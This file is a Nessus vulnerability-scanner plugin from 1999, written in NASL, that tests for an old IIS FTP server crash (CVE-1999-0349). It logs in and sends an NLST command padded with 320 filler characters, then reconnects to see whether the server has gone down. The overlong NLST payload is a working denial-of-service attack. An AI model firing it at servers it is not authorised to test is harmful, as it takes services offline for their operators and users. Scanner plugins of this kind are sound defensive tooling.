#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10118);
 script_bugtraq_id(192);
 script_version ("$Revision: 1.21 $");
 script_cve_id("CVE-1999-0349");
 name["english"] = "IIS FTP server crash";
 name["francais"] = "Plantage du serveur FTP de IIS";
 script_name(english:name["english"],
 	     francais:name["francais"]);

 desc["english"] = "It is possible to make the IIS FTP server
  close all the active connections by issuing a too long NLST command 
  which will make the server crash. An attacker can use this flaw to 
  prevent people from downloading data from your FTP server.
  Risk factor : High";

 desc["francais"] = "Il est possible de forcer un serveur 
 FTP IIS à fermer l'ensemble des connections actives en executant
  une commande 'NLST' ayant un argument trop long qui fera planter
  le serveur FTP. Un intrus peut utiliser ce problème pour empecher
  les gens de télécharger des données à partir de votre serveur
   FTP.
     
  Facteur de risque: Elevé";
 script_description(english:desc["english"],
 		    francais:desc["francais"]);
 
 script_category(ACT_DENIAL);

 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"],
 	       francais:family["francais"]);

 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
 		  francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 script_dependencie("find_service.nes", "ftp_anonymous.nasl");

 summary["english"] = "Crashes an IIS ftp server";
 summary["francais"] = "Plante un serveur ftp IIS";
 script_summary(english:summary["english"],
 		francais:summary["francais"]);
 script_require_ports("Services/ftp", 21);
 script_require_keys("ftp/login");		
 exit();
}

#
# The script code starts here
#


include('ftp_func.inc');
login = get_kb_item("ftp/login");
password = get_kb_item("ftp/password");

if(!login)exit(0);
port = get_kb_item("Services/ftp");
if(!port)port = 21;
if(!get_port_state(port))exit(0);
soc = open_sock_tcp(port);
if(soc)
{
 if(ftp_authenticate(socket:soc, user:login, pass:password))
 {
  port2 = ftp_pasv(socket:soc);
  if(!port2)exit(0);
  soc2 = open_sock_tcp(port2, transport:get_port_transport(port));
  command = string("NLST ", crap(320), "\r\n");
  send(socket:soc, data:command);
  close(soc2);
 }
 close(soc);
 
 soc3 = open_sock_tcp(port);
 if(!soc3)security_hole(port);
 else close(soc3);
}
 
  
 
